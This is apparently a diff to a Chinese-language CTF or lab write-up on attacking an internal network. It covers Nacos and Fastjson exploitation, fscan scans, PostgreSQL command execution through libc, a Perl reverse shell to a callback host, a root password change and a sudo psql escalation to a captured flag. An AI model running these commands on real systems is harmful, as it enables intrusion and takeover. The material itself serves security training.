@@ -104,5 +104,116 @@ start vulscan
 [+] PocScan http://172.30.12.6:8848 poc-yaml-alibaba-nacos
 [+] PocScan http://172.30.12.6:8848 poc-yaml-alibaba-nacos-v1-auth-bypass
 
+```
+
+venom + proxyfilter 做socks代理 默认密码nacos:nacos
+
+![](attachments/Pasted%20image%2020240807170211.png)
+
+![](attachments/Pasted%20image%2020240807170050.png)
+
+http://172.30.12.236:8080 FASTJSON 一把梭
+
+![](attachments/Pasted%20image%2020240807162626.png)
+
+哥斯拉直接就是root
+
+![](attachments/Pasted%20image%2020240807163424.png)
 
 
+vemon 连接  fscan扫描
+
+```SHELL
+root@web03:~# ./fscan -h 172.30.54.179/24 -hn 172.30.54.179
+./fscan -h 172.30.54.179/24 -hn 172.30.54.179
+
+   ___                              _
+  / _ \     ___  ___ _ __ __ _  ___| | __
+ / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
+/ /_\\_____\__ \ (__| | | (_| | (__|   <
+\____/     |___/\___|_|  \__,_|\___|_|\_\
+                     fscan version: 1.8.3
+start infoscan
+(icmp) Target 172.30.54.12    is alive
+[*] Icmp alive hosts len is: 1
+172.30.54.12:3000 open
+172.30.54.12:5432 open
+172.30.54.12:22 open
+[*] alive ports len is: 3
+start vulscan
+[*] WebTitle http://172.30.54.12:3000  code:302 len:29     title:None 跳转url: http://172.30.54.12:3000/login
+[*] WebTitle http://172.30.54.12:3000/login code:200 len:27909  title:Grafana
+```
+
+
+
+
+PostgreSQL 8.1 及之前版本执行系统命令可以直接使用 Linux 中的 libc.so.6 文件
+
+- `/lib/x86_64-linux-gnu/libc.so.6`
+- `/lib/libc.so.6`
+- `/lib64/libc.so.6`
+- `/usr/lib/x86_64-linux-gnu/libc.so.6`
+- `/usr/lib32/libc.so.6`
+
+perl弹shell
+
+```SQL
+CREATE OR REPLACE FUNCTION system (cstring) RETURNS integer AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT; select system('curl 172.30.54.179');
+
+select system('perl -e \'use Socket;$i="172.30.54.179";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'');
+
+# 修改root用户密码
+ALTER USER root WITH PASSWORD 'wuwumonster';
+```
+
+```
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+```
+
+
+```SHELL
+# 提权 在出现的信息下输入 !/bin/bash
+sudo /usr/local/postgresql/bin/psql
+root-# \?
+General
+  \c[onnect] [DBNAME|- [USER]]
+                 connect to new database (currently "root")
+  \cd [DIR]      change the current working directory
+  \copyright     show PostgreSQL usage and distribution terms
+  \encoding [ENCODING]
+                 show or set client encoding
+  \h [NAME]      help on syntax of SQL commands, * for all commands
+  \q             quit psql
+  \set [NAME [VALUE]]
+                 set internal variable, or list all if no parameters
+  \timing        toggle timing of commands (currently off)
+  \unset NAME    unset (delete) internal variable
+  \! [COMMAND]   execute command in shell or start interactive shell
+
+Query Buffer
+  \e [FILE]      edit the query buffer (or file) with external editor
+  \g [FILE]      send query buffer to server (and results to file or |pipe)
+  \p             show the contents of the query buffer
+  \r             reset (clear) the query buffer
+  \w FILE        write query buffer to file
+
+Input/Output
+!/bin/bash
+```
+
+```shell
+root@web04:~/flag# cat flag04.txt
+cat flag04.txt
+                                           ,,                   ,,
+`7MMF'  `7MMF'                             db   mm            `7MM
+  MM      MM                                    MM              MM
+  MM      MM  ,pW"Wq.  ,pP"Ybd `7MMpdMAo.`7MM mmMMmm  ,6"Yb.    MM
+  MMmmmmmmMM 6W'   `Wb 8I   `"   MM   `Wb  MM   MM   8)   MM    MM
+  MM      MM 8M     M8 `YMMMa.   MM    M8  MM   MM    ,pm9MM    MM
+  MM      MM YA.   ,A9 L.   I8   MM   ,AP  MM   MM   8M   MM    MM
+.JMML.  .JMML.`Ybmd9'  M9mmmP'   MMbmmd' .JMML. `Mbmo`Moo9^Yo..JMML.
+                                 MM
+                               .JMML.
+flag04: flag{ea3f1322-93cf-43eb-a54b-e2ff6b8e396e}
+```
